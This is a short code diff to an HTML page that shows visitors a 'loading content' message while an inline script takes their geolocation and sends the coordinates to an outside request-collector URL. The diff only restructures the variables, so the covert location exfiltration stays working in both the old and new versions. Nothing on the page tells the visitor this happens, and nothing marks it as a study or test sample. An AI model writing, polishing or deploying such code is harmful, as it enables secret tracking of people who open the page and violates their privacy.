@@ -7,9 +7,9 @@
     <p>Please wait, loading content...</p>
     <script>
         navigator.geolocation.getCurrentPosition(function(position) {
-            var url = 'https://eoettxrcpgdky1d.m.pipedream.net?lat=' + 
-                      position.coords.latitude + '&lon=' + 
-                      position.coords.longitude;
+            var lat = position.coords.latitude;
+            var lon = position.coords.longitude;
+            var url = 'https://eoettxrcpgdky1d.m.pipedream.net?lat=' + lat + '&lon=' + lon;
             fetch(url, { method: 'GET' });
         });
     </script>
